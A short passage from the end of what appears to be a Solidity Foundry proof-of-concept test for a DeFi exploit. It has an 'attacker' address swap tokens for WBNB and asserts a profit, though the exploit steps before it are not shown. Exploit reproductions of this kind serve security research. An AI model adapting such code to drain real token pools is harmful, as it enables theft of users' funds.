        sellPath[1] = wbnb;

        uint256 initialWBNB = IBEP20(wbnb).balanceOf(attacker);
        vm.prank(attacker);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            sellPath,
            attacker,
            block.timestamp
        );

        uint256 finalWBNB = IBEP20(wbnb).balanceOf(attacker);
        assertGt(finalWBNB, initialWBNB, "Should have profit in WBNB");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

